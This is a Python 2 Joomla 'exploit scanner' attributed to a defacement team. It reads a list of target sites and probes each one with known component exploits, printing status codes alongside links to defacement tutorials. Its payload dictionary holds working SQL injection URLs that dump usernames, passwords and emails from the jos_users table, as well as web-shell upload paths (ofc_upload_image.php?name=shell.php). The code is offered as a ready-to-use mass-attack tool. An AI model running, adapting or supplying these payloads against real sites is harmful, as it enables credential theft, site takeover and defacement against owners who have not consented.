
#!/usr/bin/python
#ReCode by Qiuby Zhukhi
# -= P B M =- Team
import urllib
import time
import os
import sys
W  = '\033[0m'  # white (default)
R  = '\033[31m' # red
G  = '\033[1;32m' # green bold
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan
GR = '\033[37m' # gray


os.system("clear")
def slowprint(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush() # defeat buffering
        time.sleep(8./90)
"""
slowprint (R+"\n\Gord1"+O+"Our Struggle Team"+O
"""
print "Joomla! Exploit Scanner"
slowprint("SCRIPT MOD By: "+R+"QIUBY"+W+" ZHUKHI"+"\n"+"Author: "+ R+"Gord1"+O+" Our Struggle Team"+O+W+"\r\n")

target = "/storage/emulated/0/target.txt"
respon = [400,401,404]
def site(f):
    pp=[]
    data=open(f).readlines()
    for i in data:
        i=i.split('\n')
        pp.append(i[0])
    return pp       
n = 0
site = site(target)
a = {
	"index.php?option=com_fabrik&c=import&view=import&filetype=csv&table=1" : ["com_fabrik2", "http://www.tkjcyberart.org/2016/05/deface-dengan-exploit-comfabrik.html?m=1"],
	"images/artforms/attachedfiles/" : ["com_artforms","http://shtme.co/jspEi"],
	"index.php?option=com_fabrik&c=import&view=import&filetype=csv&table=1" : ["com_fabrik","http://shtme.co/gEY4P"] ,
	"index.php?option=com_idoblog&task=profile&Itemid=1337&userid=62+union+select+1,2,concat%28username,0x3a,password,0x3a,email%29,4,5,6,7,8,9,10,11,12,13,14,15,16+from+jos_users--" : ["com_idoblog","http://shtme.co/sJfQT"],
	"index.php?option=com_ignitegallery&task=view&gallery=-4+union+all+select+1,2,group_concat(id,0x3a,name,0x3a,username,0x3a,email,0x3a,password,0x3a,usertype),4,5,6,7,8,9,10+from+jos_users--" : ["com_ignitegallery","http://shtme.co/mTYys"],
	"administrator/components/com_maian15/charts/php-ofc-library/ofc_upload_image.php?name=shell.php" : ["com_maian15","http://shtme.co/Tg6oa"],
	"administrator/components/com_maianmedia/charts/php-ofc-library/ofc_upload_image.php?name=shell.php" : ["com_maianmedia","http://shtme.co/TLckl"] ,
	"index.php?option=com_media&view=images&tmpl=component&fieldid=&e_name=jform_articletext&asset=com_content&author=&folder=" : ["com_media","http://shtme.co/Sj6RX"],
	"administrator/components/com_redmystic/chart/tmp-upload-images/" : ["com_redmystic","http://shtme.co/iIWM1"],
	"index.php?option=com_users&view=registration" : ["com_user","http://shtme.co/OF6ij"],
	"index.php?option=com_jce" : ["JCE","http://shtme.co/7tEU5"] ,
	"index.php?option=com_user&view=reset&layout=confirm" : ["com_user 2","http://shtme.co/hAGry"] ,
	"index.php?option=com_shohada&view=shohada" : ["com_shohada","http://shtme.co/C0Bvi"],
	"index.php?option=com_smartformer" : ["com_smartformer","http://shtme.co/DMyTx"],
	"index.php?option=com_garyscookbook&func=newItem" : ["com_garyscookbook","http://shtme.co/HWS6p"],
	"index.php/component/osproperty/?task=agent_register" : ["com_osproperty","http://shtme.co/YABcC"],
	"index.php?option=com_acymailing&gtask=archive&listid=" : ["com_acymailing [SQLi]","http://shtme.co/x5bnN"],
	"index.php?option=com_extplorer&action=show_error&dir=" : ["com_extplorer","http://shtme.co/Vnhat"] ,
	"index.php?option=com_xmap&tmpl=component&Itemid=999&view=" : ["com_xmap" , "http://shtme.co/VyX23"] ,
	"index.php?option=com_content&task=blogcategory&id=60&Itemid=99999%20union%20select%201,concat_ws(0x3a,username,password),3,4,5%20from%20jos_users/*" : ["com_content [SQLi]" , "http://shtme.co/3nj6v"] ,
	"index.php?option=com_flippingbook&Itemid=28&book_id=null/**/union/**/select/**/null,concat(username,0x3e,password),null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null/**/from/**/jos_users/*" : ["com_flippingbook [SQLi]" , "http://shtme.co/1oZRs"] ,
	"index.php?option=com_phocagallery&view=categories&Itemid=" : ["com_phocagallery" , "http://shtme.co/CMXIn"] ,
	"index.php?option=com_lyftenbloggie&author=62+union+select+1,concat_ws(0x3a,username,password),3,4,@@version,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30+from+jos_users--" : ["com_lyftenbloggie [SQLi]" , "http://shtme.co/mXLGj"] ,
	"index.php?option=com_wrapper&view=wrapper&Itemid=":["com_wrapper","http://shtme.co/Tir8B"] , 
	"index.php?option=com_fireboard&Itemid=":["com_fireboard","http://shtme.co/PZtCN"], "j/index.php?option=com_mailto&tmpl=component&template=beez_20&link=":["com_mailto [SPAM]","http://shtme.co/MZfKt"],
	"index.php?option=com_users&view=registration" : ["COM_USER 3","GOOGLE"]}

for expl, (nama,tutor)in a.items():
    for i in site:
        print "TESTING: %s" % C+i+W
        leng = "http://"+i+"/"+expl
        try:
            tes = urllib.urlopen(leng).getcode()
        
            if tes not in respon:
                print "EXPLOIT: \n"+O+leng+expl+W
                print P+"[!] Details [!]"+W
                print G+"CODE STATUS: "+str(tes)+W
                print "NAMA EXPLOIT: ", nama
                print "TUTORIAL ", tutor
                print "\r\n"
            else:
                print "EXPLOIT: \n"+O+leng+expl+W
                print "[!] Details [!]: "
                print R+"CODE STATUS: "+ str(tes)+W
                print "NAMA EXPLOIT: ", nama
                print "TUTORIAL ", tutor
                print "\r\n"
        except:
              print "Mungkin sitenya HTTPS :v"
print " SCAN SELESAI "